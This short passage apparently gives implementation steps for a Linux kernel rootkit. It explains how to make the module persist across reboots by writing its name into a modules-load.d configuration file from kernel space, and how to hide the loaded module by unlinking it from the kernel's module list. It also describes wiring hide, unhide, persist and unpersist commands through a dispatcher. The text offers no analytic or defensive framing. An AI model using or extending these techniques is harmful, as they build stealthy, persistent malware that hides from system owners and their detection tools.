For persistence, use filp_open to create /etc/modules-load.d/rklings.conf,
then kernel_write to write the module name. Remember to filp_close when
done. For cloaking, save THIS_MODULE->list.prev before calling list_del
on THIS_MODULE->list. To unhide, list_add with the saved pointer. Wire
both through the dispatcher: "persist", "unpersist", "h.m", "u.m".
